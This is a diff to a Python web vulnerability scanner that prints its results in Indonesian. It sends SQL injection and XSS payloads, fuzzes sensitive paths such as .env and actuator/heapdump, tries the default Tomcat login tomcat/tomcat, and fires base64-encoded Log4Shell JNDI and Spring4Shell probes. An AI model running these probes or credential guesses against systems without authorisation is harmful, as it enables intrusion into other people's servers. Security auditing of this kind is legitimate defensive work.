@@ -361,15 +361,20 @@ def vulnerability_audit():
                 elapsed = time.time() - start_t
 
                 is_vuln = False
+                reason = ""
                 if _decode('U0xFRVA=') in payload and elapsed >= 5:
                     is_vuln = True
-                elif any(x in res.text.lower() for x in ["sql syntax", "mysql_fetch", "database error"]):
-                    is_vuln = True
+                    reason = f"Eksekusi terkonfirmasi via delay respon {elapsed:.2f}s."
+                else:
+                    error_sig = [x for x in ["sql syntax", "mysql_fetch", "database error"] if x in res.text.lower()]
+                    if error_sig:
+                        is_vuln = True
+                        reason = f"Bocoran error database ditemukan: '{error_sig[0]}'"
 
                 status = "[\033[91mVULNERABLE!\033[0m]" if is_vuln else "[\033[92mSAFE\033[0m]"
-                print(f" [{ts}] Payload: {payload.ljust(45)} {status}")
-
+                print(f" [{ts}] Attacking: {payload.ljust(35)} {status}")
                 if is_vuln:
+                    print(f"      |_ Result : {reason}")
                     findings.append({"type": _decode("U1FMIEluamVjdGlvbg=="), "severity": "HIGH", "loc": base_audit_url, "method": method})
             except:
                 print(f" [{ts}] Payload: {payload.ljust(45)} [TIMEOUT/ERROR]")
@@ -393,9 +398,12 @@ def vulnerability_audit():
                 is_vuln = payload in response_text
 
                 status = "[\033[91mVULNERABLE!\033[0m]" if is_vuln else "[\033[92mSAFE\033[0m]"
-                print(f" [{ts}] Payload: {payload[:45].ljust(45)} {status}")
+                print(f" [{ts}] Attacking: {payload[:35].ljust(35)} {status}")
 
                 if is_vuln:
+                    start_idx = max(0, response_text.find(payload) - 10)
+                    snippet = response_text[start_idx : start_idx + 40].replace('\n', ' ')
+                    print(f"      |_ Result : Payload terpantul pada body: \"...{snippet}...\"")
                     findings.append({"type": _decode("UmVmbGVjdGVkIFhTUw=="), "severity": "MEDIUM", "loc": base_audit_url, "method": method})
             except:
                 print(f" [{ts}] Payload: {payload[:45].ljust(45)} [ERROR]")
@@ -476,11 +484,14 @@ def infrastructure_audit():
                             r_finger = session.get(p_url, timeout=3)
                             server = r_finger.headers.get('Server', 'Unknown')
                             powered = r_finger.headers.get('X-Powered-By', 'Unknown')
-                            print(f"      |_ Server: {server} | Technology: {powered}")
+                            print(f"      |_ Fingerprint: Server '{server}' | Technology '{powered}'")
                             
                             # Check Directory Listing
                             is_dir = _decode("SW5kZXggb2YgLw==") in r_finger.text
-                            print(f"      |_ Directory Listing Check         : {'[\033[91mVULN\033[0m]' if is_dir else '[\033[92mSAFE\033[0m]'}")
+                            if is_dir:
+                                print(f"      |_ Result: [\033[91mVULNERABLE!\033[0m] Index of / terbuka. Struktur file terlihat publik.")
+                            else:
+                                print(f"      |_ Result: [SAFE] Directory listing tidak diizinkan oleh server.")
                         except: pass
 
                         # 2. Proxy Abuse / Open Proxy Check
@@ -489,10 +500,14 @@ def infrastructure_audit():
                             # Mencoba meminta URL eksternal via port 8080 (Proxy Testing)
                             r_proxy = session.get(p_url, headers={'Host': 'www.google.com'}, timeout=3)
                             is_proxy = any(x in r_proxy.text.lower() for x in ["google", "window.google"])
-                            print(f"      |_ Open Proxy Vulnerability        : {'[\033[91mVULN\033[0m]' if is_proxy else '[\033[92mSAFE\033[0m]'}")
+                            if is_proxy:
+                                print(f"      |_ Result: [\033[91mVULNERABLE!\033[0m] Host Header Injection sukses. Server bertindak sebagai Open Proxy.")
+                            else:
+                                print(f"      |_ Result: [SAFE] Server mengabaikan injeksi Host header eksternal.")
                         except: pass
 
                         # 3. Directory Brute Forcing (Fuzzing Sensitive Paths)
+                        print(f"      [*] {_decode('RGlyZWN0b3J5IEJydXRlIEZvcmNpbmcgKEZ1enppbmcgU2Vuc2l0aXZlIFBhdGhzKQ==')}")
                         attack_paths = [
                             "manager/html", "phpmyadmin/", ".env", "config.php",
                             "actuator/env", "actuator/heapdump", "actuator/health",
@@ -503,20 +518,22 @@ def infrastructure_audit():
                             try:
                                 r_fuzz = session.get(p_url + path, timeout=2)
                                 if r_fuzz.status_code == 200:
-                                    print(f"      |_ Found Sensitive Path            : [\033[91m/{path}\033[0m]")
+                                    print(f"      |_ Result: [\033[91m!\033[0m] Terdeteksi: /{path.ljust(15)} (Ukuran: {len(r_fuzz.content)} bytes)")
                                     
                                     # 4. Credential Stuffing (Simulated Default Account Check)
                                     if "manager/html" in path or "phpmyadmin" in path:
                                         print(f"      [*] {_decode('Q3JlZGVudGlhbCBTdHVmZmluZyAoRGVmYXVsdCBBY2NvdW50IENoZWNrKQ==')}")
+                                        print(f"      |_ Mencoba login default: tomcat/tomcat")
                                         # Simulate Basic Auth for Tomcat Manager (tomcat/tomcat)
                                         r_auth = session.get(p_url + path, auth=('tomcat', 'tomcat'), timeout=2)
                                         if r_auth.status_code == 200:
-                                            print(f"      |_ [\033[91m!\033[0m] Default Account Found!   : tomcat/tomcat")
+                                            print(f"      |_ Result: [\033[91m!\033[0m] Sukses! Kredensial default diterima oleh server.")
                             except: pass
 
                         # 5. Log4Shell (CVE-2021-44228) & Spring4Shell Probing
                         print(f"      [*] {_decode('TG9nNFNoZWxsL1NwcmluZzRTaGVsbCBQcm9iaW5n')}")
                         jndi_payload = _decode("JHtqbmRpOmxkYXA6Ly8xMjcuMC4wLjE6MTM4OS9hfQ==")
+                        print(f"      |_ Melakukan probing RCE via injeksi JNDI pada HTTP headers.")
                         try:
                             # Mengirim payload di berbagai header yang biasanya di-log oleh Log4j
                             headers_to_test = {
@@ -525,13 +542,15 @@ def infrastructure_audit():
                                 'X-Forwarded-For': jndi_payload,
                                 'Referer': jndi_payload
                             }
+                            print(f"      |_ Mengirim: {jndi_payload[:25]}...")
                             r_log4j = session.get(p_url, headers=headers_to_test, timeout=3)
                             # Deteksi Spring4Shell (CVE-2022-22965) via Class Introspection
+                            print(f"      |_ Melakukan probing Spring4Shell via Class Loader manipulation.")
                             r_spring = session.get(p_url + "?class.module.classLoader.URLs[0]=0", timeout=2)
                             if r_spring.status_code == 400: # Typical response for some patched/blocked spring apps
-                                print(f"      |_ Spring4Shell Surface Detected   : [\033[93mPROBE SENT\033[0m]")
+                                print(f"      |_ Result: [\033[93m!\033[0m] Indikasi Spring4Shell terdeteksi (Class Introspection diblokir/error).")
                             else:
-                                print(f"      |_ Injection Payloads Sent         : [\033[92mCOMPLETED\033[0m]")
+                                print(f"      |_ Result: [SAFE] Tidak ditemukan anomali pada respon injeksi.")
                         except: pass
 
                     except: pass
